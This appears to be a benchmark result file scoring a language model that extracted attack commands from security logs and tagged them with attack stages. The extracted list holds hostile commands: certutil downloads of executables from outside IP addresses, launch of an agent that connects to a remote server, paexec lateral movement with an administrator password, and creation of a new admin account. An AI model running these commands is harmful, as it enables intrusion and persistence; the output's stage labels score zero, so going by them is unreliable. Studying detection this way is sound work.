@@ -1,0 +1,74 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Persistence"
+      },
+      {
+        "command": "paexec \\192.168.0.95 -u administrator -p Data123456! ipconfig",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "paexec \\192.168.0.244 -u administrator -p Data123456! ipconfig",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "net user nbb nb123. /add & net localgroup administrators nbb /add",
+        "stage": "Privilege Escalation"
+      }
+    ],
+    "narrative": "The logs indicate a multi-stage attack where initial access is gained via a URL download of an executable, followed by execution of said executable to establish persistence through registry modifications and service creation. The attackers then move laterally within the network using a remote execution utility and escalate privileges by adding a new user with administrative rights.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 20449,
+      "completion_tokens": 435,
+      "total_tokens": 20884,
+      "wall_clock_s": 5.021,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.16666666666666666,
+      "recall": 0.16666666666666666,
+      "f1": 0.16666666666666666,
+      "tp": 1,
+      "fp": 5,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 6,
+      "fn": 6,
+      "recall_partial": 0.08333333333333333
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 20449,
+      "completion_tokens": 435,
+      "total_tokens": 20884,
+      "wall_clock_s": 5.021,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
